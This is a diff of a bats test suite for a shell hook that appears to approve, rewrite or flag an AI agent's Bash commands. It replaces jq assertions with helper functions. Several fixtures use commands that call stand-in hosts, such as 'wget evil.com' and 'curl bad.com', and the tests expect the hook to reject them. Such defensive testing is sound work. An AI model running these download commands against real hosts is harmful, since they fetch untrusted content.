@@ -16,8 +16,8 @@ setup() {
 
   bats_run_zsh "$SCRIPT" <<<'{"tool_name":"Bash","tool_input":{"command":"echo hello"}}'
   [[ "$status" -eq 0 ]]
-  [[ "$(echo "$output" | jq -r '.hookSpecificOutput.permissionDecision')" = "allow" ]]
-  [[ "$(echo "$output" | jq -r '.hookSpecificOutput.updatedInput.command')" = "echo hello" ]]
+  expect_json '.hookSpecificOutput.permissionDecision' 'allow'
+  expect_json '.hookSpecificOutput.updatedInput.command' 'echo hello'
 }
 
 @test "allow with updatedInput.command when solkan allows and RTK rewrites" {
@@ -29,8 +29,8 @@ setup() {
 
   bats_run_zsh "$SCRIPT" <<<'{"tool_name":"Bash","tool_input":{"command":"git status"}}'
   [[ "$status" -eq 0 ]]
-  [[ "$(echo "$output" | jq -r '.hookSpecificOutput.permissionDecision')" = "allow" ]]
-  [[ "$(echo "$output" | jq -r '.hookSpecificOutput.updatedInput.command')" = "rtk git status" ]]
+  expect_json '.hookSpecificOutput.permissionDecision' 'allow'
+  expect_json '.hookSpecificOutput.updatedInput.command' 'rtk git status'
 }
 
 @test "ask permissionDecision with updatedInput when solkan refuses and RTK does not rewrite" {
@@ -43,8 +43,8 @@ setup() {
 
   bats_run_zsh "$SCRIPT" <<<'{"tool_name":"Bash","tool_input":{"command":"wget evil.com"}}'
   [[ "$status" -eq 0 ]]
-  [[ "$(echo "$output" | jq -r '.hookSpecificOutput.permissionDecision')" = "ask" ]]
-  [[ "$(echo "$output" | jq -r '.hookSpecificOutput.updatedInput.command')" = "wget evil.com" ]]
+  expect_json '.hookSpecificOutput.permissionDecision' 'ask'
+  expect_json '.hookSpecificOutput.updatedInput.command' 'wget evil.com'
 }
 
 @test "ask permissionDecision with updatedInput.command when solkan refuses and RTK rewrites" {
@@ -57,8 +57,8 @@ setup() {
 
   bats_run_zsh "$SCRIPT" <<<'{"tool_name":"Bash","tool_input":{"command":"git status"}}'
   [[ "$status" -eq 0 ]]
-  [[ "$(echo "$output" | jq -r '.hookSpecificOutput.permissionDecision')" = "ask" ]]
-  [[ "$(echo "$output" | jq -r '.hookSpecificOutput.updatedInput.command')" = "rtk git status" ]]
+  expect_json '.hookSpecificOutput.permissionDecision' 'ask'
+  expect_json '.hookSpecificOutput.updatedInput.command' 'rtk git status'
 }
 
 @test "permissionDecisionReason lists rejected commands when solkan refuses" {
@@ -71,7 +71,7 @@ setup() {
 
   bats_run_zsh "$SCRIPT" <<<'{"tool_name":"Bash","tool_input":{"command":"wget evil.com && curl bad.com"}}'
   [[ "$status" -eq 0 ]]
-  [[ "$(echo "$output" | jq -r '.hookSpecificOutput.permissionDecisionReason')" = "❌ wget, curl ❌" ]]
+  expect_json '.hookSpecificOutput.permissionDecisionReason' '❌ wget, curl ❌'
 }
 
 @test "ask shows single rejected command" {
@@ -84,7 +84,7 @@ setup() {
 
   bats_run_zsh "$SCRIPT" <<<'{"tool_name":"Bash","tool_input":{"command":"wget evil.com"}}'
   [[ "$status" -eq 0 ]]
-  [[ "$(echo "$output" | jq -r '.hookSpecificOutput.permissionDecisionReason')" = "❌ wget ❌" ]]
+  expect_json '.hookSpecificOutput.permissionDecisionReason' '❌ wget ❌'
 }
 
 @test "no systemMessage when solkan rejects" {
@@ -97,7 +97,7 @@ setup() {
 
   bats_run_zsh "$SCRIPT" <<<'{"tool_name":"Bash","tool_input":{"command":"wget evil.com"}}'
   [[ "$status" -eq 0 ]]
-  [[ "$(echo "$output" | jq '.hookSpecificOutput.systemMessage')" = "null" ]]
+  expect_json_null '.hookSpecificOutput.systemMessage'
 }
 
 @test "hook logs to CLAUDE_HOOKS_LOG_DIR" {
@@ -121,7 +121,7 @@ setup() {
 
   bats_run_zsh "$SCRIPT" <<<'{"tool_name":"Bash","tool_input":{"command":"echo \\xa0"}}'
   [[ "$status" -eq 0 ]]
-  [[ "$(echo "$output" | jq -r '.hookSpecificOutput.updatedInput.command')" = 'echo \xa0' ]]
+  expect_json '.hookSpecificOutput.updatedInput.command' 'echo \xa0'
 }
 
 @test "no background jobs in script" {
@@ -156,8 +156,8 @@ setup() {
 
   bats_run_zsh "$SCRIPT" <<<'{"session_id":"test","tool_name":"Bash","tool_input":{"command":"wget evil.com"}}'
   [[ "$status" -eq 0 ]]
-  [[ "$(echo "$output" | jq -r '.hookSpecificOutput.permissionDecision')" = "ask" ]]
-  [[ "$(echo "$output" | jq -r '.hookSpecificOutput.permissionDecisionReason')" = "❌ wget ❌" ]]
+  expect_json '.hookSpecificOutput.permissionDecision' 'ask'
+  expect_json '.hookSpecificOutput.permissionDecisionReason' '❌ wget ❌'
 }
 
 @test "repeat encounter: defer with no reason" {
@@ -173,8 +173,8 @@ setup() {
 
   bats_run_zsh "$SCRIPT" <<<'{"session_id":"test","tool_name":"Bash","tool_input":{"command":"wget evil.com"}}'
   [[ "$status" -eq 0 ]]
-  [[ "$(echo "$output" | jq -r '.hookSpecificOutput.permissionDecision')" = "defer" ]]
-  [[ "$(echo "$output" | jq '.hookSpecificOutput.permissionDecisionReason')" = "null" ]]
+  expect_json '.hookSpecificOutput.permissionDecision' 'defer'
+  expect_json_null '.hookSpecificOutput.permissionDecisionReason'
 }
 
 @test "multi-reject all new: ask with all rejected in reason" {
@@ -187,8 +187,8 @@ setup() {
 
   bats_run_zsh "$SCRIPT" <<<'{"session_id":"test","tool_name":"Bash","tool_input":{"command":"wget evil.com && curl bad.com"}}'
   [[ "$status" -eq 0 ]]
-  [[ "$(echo "$output" | jq -r '.hookSpecificOutput.permissionDecision')" = "ask" ]]
-  [[ "$(echo "$output" | jq -r '.hookSpecificOutput.permissionDecisionReason')" = "❌ wget, curl ❌" ]]
+  expect_json '.hookSpecificOutput.permissionDecision' 'ask'
+  expect_json '.hookSpecificOutput.permissionDecisionReason' '❌ wget, curl ❌'
 }
 
 @test "multi-reject all seen: defer with no reason" {
@@ -204,8 +204,8 @@ setup() {
 
   bats_run_zsh "$SCRIPT" <<<'{"session_id":"test","tool_name":"Bash","tool_input":{"command":"wget evil.com && curl bad.com"}}'
   [[ "$status" -eq 0 ]]
-  [[ "$(echo "$output" | jq -r '.hookSpecificOutput.permissionDecision')" = "defer" ]]
-  [[ "$(echo "$output" | jq '.hookSpecificOutput.permissionDecisionReason')" = "null" ]]
+  expect_json '.hookSpecificOutput.permissionDecision' 'defer'
+  expect_json_null '.hookSpecificOutput.permissionDecisionReason'
 }
 
 @test "multi-reject mixed: ask with only new rejected in reason" {
@@ -221,6 +221,6 @@ setup() {
 
   bats_run_zsh "$SCRIPT" <<<'{"session_id":"test","tool_name":"Bash","tool_input":{"command":"wget evil.com && curl bad.com"}}'
   [[ "$status" -eq 0 ]]
-  [[ "$(echo "$output" | jq -r '.hookSpecificOutput.permissionDecision')" = "ask" ]]
-  [[ "$(echo "$output" | jq -r '.hookSpecificOutput.permissionDecisionReason')" = "❌ curl ❌" ]]
+  expect_json '.hookSpecificOutput.permissionDecision' 'ask'
+  expect_json '.hookSpecificOutput.permissionDecisionReason' '❌ curl ❌'
 }
